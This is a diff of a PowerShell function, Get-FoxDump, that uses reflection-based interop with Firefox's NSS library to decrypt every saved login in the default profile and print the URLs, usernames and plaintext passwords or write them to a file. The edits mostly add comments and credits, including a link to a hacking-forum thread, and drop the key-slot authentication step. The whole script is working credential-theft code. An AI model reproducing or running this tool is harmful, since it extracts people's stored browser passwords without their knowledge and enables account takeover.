@@ -1,4 +1,4 @@
-function Get-FoxDump 
+﻿Function Get-FoxDump 
 {
     <#
     .SYNOPSIS 
@@ -21,7 +21,7 @@ function Get-FoxDump
 
     #>
 
-    
+    #References: http://xakfor.net/threads/c-firefox-36-password-cookie-recovery.12192/
 
     [CmdletBinding()]
     param
@@ -30,7 +30,7 @@ function Get-FoxDump
         [string]$OutFile
 
     )
-    
+    #PSREFLECT CODE
     function New-InMemoryModule
   {
     <#
@@ -85,7 +85,8 @@ function Get-FoxDump
     }
 
 
-  
+  # A helper function used to reduce typing while defining function
+  # prototypes for Add-Win32Type.
   function func
   {
         Param
@@ -300,7 +301,7 @@ function Get-FoxDump
                     $ReturnType,
                     $ParameterTypes)
 
-                
+                # Make each ByRef parameter an Out parameter
                 $i = 1
                 foreach($Parameter in $ParameterTypes)
                 {
@@ -318,7 +319,7 @@ function Get-FoxDump
                 $CharsetField = $DllImport.GetField('CharSet')
                 if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }
 
-                
+                # Equivalent to C# version of [DllImport(DllName)]
                 $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
                 $DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                     $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
@@ -460,7 +461,7 @@ function Get-FoxDump
 
         foreach ($Key in $EnumElements.Keys)
         {
-            
+            # Apply the specified enum type to each element
             $null = $EnumBuilder.DefineLiteral($Key, $EnumElements[$Key] -as $EnumType)
         }
 
@@ -468,7 +469,8 @@ function Get-FoxDump
     }
 
 
-  
+  # A helper function used to reduce typing while defining struct
+  # fields.
   function field
   {
         Param
@@ -579,7 +581,7 @@ function Get-FoxDump
             e_lfanew =   field 18 Int32
         }
 
-        
+        # Example of using an explicit layout in order to create a union.
         $TestUnion = struct $Mod TestUnion @{
             field1 = field 0 UInt32 0
             field2 = field 1 IntPtr 0
@@ -643,7 +645,9 @@ function Get-FoxDump
 
         $Fields = New-Object Hashtable[]($StructFields.Count)
 
-        
+        # Sort each field according to the orders specified
+        # Unfortunately, PSv2 doesn't have the luxury of the
+        # hashtable [Ordered] accelerator.
         foreach ($Field in $StructFields.Keys)
         {
             $Index = $StructFields[$Field]['Position']
@@ -681,13 +685,14 @@ function Get-FoxDump
             if ($ExplicitLayout) { $NewField.SetOffset($Offset) }
         }
 
-        
+        # Make the struct aware of its own size.
+        # No more having to call [Runtime.InteropServices.Marshal]::SizeOf!
         $SizeMethod = $StructBuilder.DefineMethod('GetSize',
             'Public, Static',
             [Int],
             [Type[]] @())
         $ILGenerator = $SizeMethod.GetILGenerator()
-        
+        # Thanks for the help, Jason Shirk!
         $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
         $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
             [Type].GetMethod('GetTypeFromHandle'))
@@ -695,7 +700,8 @@ function Get-FoxDump
             [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
         $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)
 
-        
+        # Allow for explicit casting from an IntPtr
+        # No more having to call [Runtime.InteropServices.Marshal]::PtrToStructure!
         $ImplicitConverter = $StructBuilder.DefineMethod('op_Implicit',
             'PrivateScope, Public, Static, HideBySig, SpecialName',
             $StructBuilder,
@@ -713,11 +719,13 @@ function Get-FoxDump
 
         $StructBuilder.CreateType()
     }
-    
+    #end of PSREFLECT CODE
+
+    #http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
 
     
    
-    
+    #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
     Function Get-DelegateType
     {
         Param
@@ -838,7 +846,8 @@ function Get-FoxDump
             [string]$cipherText
         )
 
-        
+        #Cast the result from the Decode buffer function as a TSECItem struct and create an empty struct. Decrypt the cipher text and then
+        #store it inside the empty struct.
         $Result = $NSSBase64_DecodeBuffer.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $cipherText, $cipherText.Length)
         Write-Verbose "[+]NSSBase64_DecodeBuffer Result: $Result"
         $ResultPtr = $Result -as [IntPtr]
@@ -870,14 +879,6 @@ function Get-FoxDump
     $NSSInitDelegates = Get-DelegateType @([string]) ([long])
     $NSS_Init = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NSSInitAddr, $NSSInitDelegates)
 
-    $PK11GetKeySlotAddr = $Kernel32::GetProcAddress($nssdllhandle, "PK11_GetInternalKeySlot")
-    $PK11GetKeySlotDelegates = Get-DelegateType @() ([long])
-    $PK11_GetKeySlot = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($PK11GetKeySlotAddr, $PK11GetKeySlotDelegates)
-
-    $PK11AuthenticateAddr = $Kernel32::GetProcAddress($nssdllhandle, "PK11_Authenticate")
-    $PK11AuthenticateDelegates = Get-DelegateType @([long], [bool], [long]) ([long])
-    $PK11_Authenticate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($PK11AuthenticateAddr, $PK11AuthenticateDelegates)
-
     $NSSBase64_DecodeBufferAddr = $Kernel32::GetProcAddress($nssdllhandle, "NSSBase64_DecodeBuffer")
     $NSSBase64_DecodeBufferDelegates = Get-DelegateType @([IntPtr], [IntPtr], [string], [int]) ([int])
     $NSSBase64_DecodeBuffer = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NSSBase64_DecodeBufferAddr, $NSSBase64_DecodeBufferDelegates)
@@ -886,20 +887,16 @@ function Get-FoxDump
     $PK11SDR_DecryptDelegates = Get-DelegateType @([Type]$TSECItem.MakeByRefType(),[Type]$TSECItem.MakeByRefType(), [int]) ([int])
     $PK11SDR_Decrypt = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($PK11SDR_DecryptAddr, $PK11SDR_DecryptDelegates)
     
-
     $profilePath = "$($env:APPDATA)\Mozilla\Firefox\Profiles\*.default"
+    
     $defaultProfile = $(Get-ChildItem $profilePath).FullName
     $NSSInitResult = $NSS_Init.Invoke($defaultProfile)
     Write-Verbose "[+]NSS_Init result: $NSSInitResult"
-    $keySlot = $PK11_GetKeySlot.Invoke()
-    Write-Verbose "[+]Keyslot : $keySlot"
-    $PK11_AuthResult = $PK11_Authenticate.Invoke($keySlot, $True, 0)
-    Write-Verbose "[+]PK11_Authenticate Result: $PK11_AuthResult"
     
 
-    if(Test-Path $profilePath)
+    if(Test-Path $defaultProfile)
     {
-        
+        #Web.extensions assembly is necessary for handling json files
         try
         {
            Add-Type -AssemblyName System.web.extensions 
@@ -924,7 +921,7 @@ function Get-FoxDump
         $logins = $obj['logins']
         $count = ($logins.Count) - 1
         $passwordlist = @()
-       
+        #Iterate through each login entry and decrypt the username and password fields
         for($i = 0; $i -le $count; $i++)
         {
             Write-Verbose "[+]Decrypting login information..."
@@ -938,7 +935,7 @@ function Get-FoxDump
             }
             $passwordlist += $FoxCreds
         }
-        
+        #Spit out the results to a file.... or not.
         if($OutFile)
         {
             $passwordlist | Format-List URL, UserName, Password | Out-File -Encoding ascii $OutFile
